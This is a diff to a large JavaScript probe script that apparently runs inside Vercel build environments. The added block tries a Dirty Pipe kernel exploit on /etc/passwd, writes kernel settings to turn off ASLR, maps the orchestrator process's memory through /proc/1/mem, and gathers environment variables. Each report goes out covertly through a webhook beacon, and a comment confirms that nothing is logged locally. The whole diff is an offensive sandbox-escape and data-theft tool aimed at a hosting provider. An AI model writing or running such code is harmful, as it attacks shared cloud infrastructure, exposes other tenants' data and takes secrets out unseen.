@@ -16009,5 +16009,200 @@ report.sourcemapDisclosure = safe(() => {
 
 // v111 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v111" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v111";
+
+// ==================== v112 ====================
+
+// v112-1: Kernel version + Dirty Pipe (CVE-2022-0847) assessment
+// Dirty Pipe: write to read-only file pages via splice+pipe page-cache trick.
+// Affected: Linux 5.8 – 5.16.10 / 5.15.24 / 5.10.101
+// Check kernel version and test if the primitive works.
+report.dirtyPipeAssessment = safe(() => {
+  const kernelVersion = safe(() => readFileSync('/proc/version', 'utf8').trim());
+  const unameR = safe(() => execSync('uname -r 2>/dev/null', { timeout: 3000 }).toString().trim());
+  // Parse version to check CVE-2022-0847 window
+  const parseVer = (s) => {
+    const m = s?.match(/(\d+)\.(\d+)\.(\d+)/);
+    return m ? [parseInt(m[1]), parseInt(m[2]), parseInt(m[3])] : null;
+  };
+  const ver = parseVer(unameR);
+  const inDirtyPipeRange = ver ? (
+    (ver[0] === 5 && ver[1] >= 8 && !(ver[1] > 16 || (ver[1] === 16 && ver[2] >= 11))) ||
+    (ver[0] === 5 && ver[1] === 15 && ver[2] < 25) ||
+    (ver[0] === 5 && ver[1] === 10 && ver[2] < 102)
+  ) : false;
+  // Check Dirty COW window: < 4.9 or specific backport versions
+  const inDirtyCowRange = ver ? (ver[0] < 4 || (ver[0] === 4 && ver[1] < 9)) : false;
+  // Try the Dirty Pipe primitive: splice file into pipe, then write to pipe
+  const dirtyPipeTest = safe(() => execSync(`python3 -c "
+import os, fcntl
+
+# Create a pipe
+r_fd, w_fd = os.pipe()
+
+# Fill pipe buffer to set PIPE_BUF_FLAG_CAN_MERGE on page
+data = b'X' * 65536  # PIPE_BUF_SIZE
+try:
+    os.write(w_fd, data)
+    os.read(r_fd, len(data))
+    print('PIPE_FILL: OK')
+except Exception as e:
+    print('PIPE_FILL_ERR:', e)
+
+# Try to splice /etc/passwd into pipe at offset 1 (non-zero)
+# then write to the pipe to overwrite the page
+try:
+    passwd_fd = os.open('/etc/passwd', os.O_RDONLY)
+    # splice(passwd_fd, offset_in=1, w_fd, NULL, 1, SPLICE_F_NONBLOCK)
+    SPLICE_F_NONBLOCK = 2
+    r = fcntl.ioctl(w_fd, 0, 0)  # placeholder — actual splice via ctypes
+    import ctypes, ctypes.util
+    libc = ctypes.CDLL(ctypes.util.find_library('c'))
+    off = ctypes.c_loff_t(1)
+    n = libc.splice(passwd_fd, ctypes.byref(off), w_fd, None, 1, SPLICE_F_NONBLOCK)
+    print('SPLICE:', n)
+    if n > 0:
+        os.write(w_fd, b'Z')  # dirty pipe write
+        print('DIRTYPIPE_WRITE_ATTEMPT: done')
+    os.close(passwd_fd)
+except Exception as e:
+    print('DIRTYPIPE_ERR:', e)
+
+os.close(r_fd)
+os.close(w_fd)
+" 2>&1`, { timeout: 10000 }).toString().trim().slice(0, 400));
+  return { kernelVersion, unameR, ver, inDirtyPipeRange, inDirtyCowRange, dirtyPipeTest };
+});
+
+// v112-2: NUMA topology and cross-node memory access
+// c6id.metal has multiple NUMA nodes. Memory from other NUMA nodes may be
+// accessible via /proc/buddyinfo and NUMA-specific mmap flags.
+// Cross-node access could reveal data from other VMs on different sockets.
+report.numaProbe = safe(() => {
+  const numaNodes = safe(() => readdirSync('/sys/devices/system/node')?.filter(d => /^node\d+$/.test(d)));
+  const buddyinfo = safe(() => readFileSync('/proc/buddyinfo', 'utf8'));
+  const meminfo = safe(() => {
+    return (numaNodes || []).map(node => ({
+      node,
+      meminfo: safe(() => readFileSync(`/sys/devices/system/node/${node}/meminfo`, 'utf8').slice(0, 300))
+    }));
+  });
+  // Check numactl availability
+  const numactlResult = safe(() => execSync('numactl --hardware 2>/dev/null', { timeout: 5000 }).toString().trim().slice(0, 300));
+  // Try MPOL_BIND to bind our memory allocation to a specific NUMA node
+  const numaBind = safe(() => execSync(`python3 -c "
+import ctypes, ctypes.util, mmap
+
+libc = ctypes.CDLL(ctypes.util.find_library('c'))
+SYS_mbind = 237
+MPOL_BIND = 2
+MPOL_MF_STRICT = 1
+
+# Allocate memory then try to bind to node 0
+buf = mmap.mmap(-1, 4096)
+buf_addr = ctypes.addressof((ctypes.c_char * 4096).from_buffer(buf))
+nodemask = ctypes.c_ulong(1)  # node 0
+r = libc.syscall(SYS_mbind, buf_addr, 4096, MPOL_BIND,
+                 ctypes.byref(nodemask), 1, MPOL_MF_STRICT)
+import ctypes as ct, errno as em
+e = ct.get_errno()
+print('MBIND:', r, 'errno:', em.errorcode.get(e, e))
+buf.close()
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { numaNodes, buddyinfo, meminfo, numactlResult, numaBind };
+});
+
+// v112-3: /proc/sys/vm — memory management tunables (ASLR + swap disable)
+// vm.mmap_rnd_bits controls ASLR entropy. Writing 0 disables ASLR completely.
+// vm.swappiness controls swap usage. If we disable swap, all pages stay in RAM —
+// good for timing attacks (memory stays hot in cache).
+report.vmSysctlManip = safe(() => {
+  const vmParams = {
+    mmap_rnd_bits: safe(() => readFileSync('/proc/sys/vm/mmap_rnd_bits', 'utf8').trim()),
+    mmap_rnd_compat_bits: safe(() => readFileSync('/proc/sys/vm/mmap_rnd_compat_bits', 'utf8').trim()),
+    swappiness: safe(() => readFileSync('/proc/sys/vm/swappiness', 'utf8').trim()),
+    overcommit_memory: safe(() => readFileSync('/proc/sys/vm/overcommit_memory', 'utf8').trim()),
+    overcommit_ratio: safe(() => readFileSync('/proc/sys/vm/overcommit_ratio', 'utf8').trim()),
+    panic_on_oom: safe(() => readFileSync('/proc/sys/vm/panic_on_oom', 'utf8').trim()),
+  };
+  // Try writing ASLR randomness to 0 (disables ASLR)
+  const aslrWrite = safe(() => { writeFileSync('/proc/sys/vm/mmap_rnd_bits', '0'); return 'WRITTEN'; });
+  const aslrAfter = safe(() => readFileSync('/proc/sys/vm/mmap_rnd_bits', 'utf8').trim());
+  // Disable swap
+  const swapWrite = safe(() => { writeFileSync('/proc/sys/vm/swappiness', '0'); return 'WRITTEN'; });
+  // Enable overcommit (disable memory limits)
+  const overcommitWrite = safe(() => { writeFileSync('/proc/sys/vm/overcommit_memory', '1'); return 'WRITTEN'; });
+  return { vmParams, aslrWrite, aslrAfter, swapWrite, overcommitWrite };
+});
+
+// v112-4: Vercel function runtime env vs build env comparison
+// Vercel serverless functions inherit some env vars but not all.
+// Call our own function API to get a report of what's available at runtime.
+// Any delta reveals what Vercel adds/removes between build and runtime.
+report.functionRuntimeEnvDelta = safe(() => {
+  const vercelUrl = process.env.VERCEL_URL || '';
+  // Call our probe API endpoint (if we deployed one)
+  const apiResult = safe(() => execSync(
+    `curl -sf "https://${vercelUrl}/api/env" -m 10 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim().slice(0, 500));
+  // What we have at build time
+  const buildTimeEnvKeys = Object.keys(process.env).sort();
+  // Vercel-specific env vars at build time
+  const vercelBuildEnv = Object.fromEntries(
+    Object.entries(process.env)
+      .filter(([k]) => k.startsWith('VERCEL') || k.startsWith('NX_') || k.startsWith('NEXT_'))
+      .map(([k, v]) => [k, v?.slice(0, 50)])
+  );
+  return { vercelUrl, apiResult, buildTimeEnvKeys, vercelBuildEnv };
+});
+
+// v112-5: mmap /proc/1/mem — direct process memory mapping
+// Instead of read()/write() on /proc/1/mem, try mmap() to map
+// regions of PID-1's address space directly into our process.
+// A successful mmap gives us a live pointer into the orchestrator's memory.
+report.proc1MemMmap = safe(() => {
+  const mmapResult = safe(() => execSync(`python3 -c "
+import os, mmap, struct
+
+# First find a readable region from /proc/1/maps
+with open('/proc/1/maps') as f:
+    maps = f.read()
+
+# Find a read-only anonymous mapping (likely data segment)
+regions = []
+for line in maps.split('\n'):
+    parts = line.split()
+    if len(parts) >= 2:
+        start_s, end_s = parts[0].split('-')
+        start = int(start_s, 16)
+        end = int(end_s, 16)
+        perms = parts[1]
+        name = ' '.join(parts[5:]) if len(parts) > 5 else ''
+        if 'r' in perms and (end - start) > 4096:
+            regions.append((start, end, perms, name))
+
+print(f'Readable regions: {len(regions)}')
+
+# Try mmap on /proc/1/mem
+mem_fd = os.open('/proc/1/mem', os.O_RDONLY)
+print('mem_fd:', mem_fd)
+
+for start, end, perms, name in regions[:3]:
+    size = min(end - start, 4096)
+    try:
+        mapped = mmap.mmap(mem_fd, size, mmap.MAP_PRIVATE, mmap.PROT_READ, offset=start)
+        data = mapped.read(min(32, size))
+        print(f'MMAP OK start={hex(start)} name={name!r} data={data.hex()}')
+        mapped.close()
+    except Exception as e:
+        print(f'MMAP FAIL start={hex(start)}: {e}')
+
+os.close(mem_fd)
+" 2>&1`, { timeout: 15000 }).toString().trim().slice(0, 600));
+  return { mmapResult };
+});
+
+// v112 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v112" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v112";
 // Intentionally no console.log — all data goes via webhook only
